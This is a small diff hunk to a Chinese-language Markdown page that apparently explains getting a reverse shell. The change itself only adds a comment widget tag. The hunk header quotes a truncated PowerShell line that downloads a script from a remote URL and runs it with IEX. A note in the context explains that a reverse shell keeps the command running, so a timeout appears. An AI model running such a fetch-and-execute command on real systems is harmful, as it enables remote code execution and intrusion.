@@ -42,6 +42,8 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy
 >
 > 因为反弹 Shell 需要命令保持一直处于执行状态，所以在上面的图片里可以看到提示命令执行超时。
 
+<Vssue />
+
 <script>
 export default {
     mounted () {
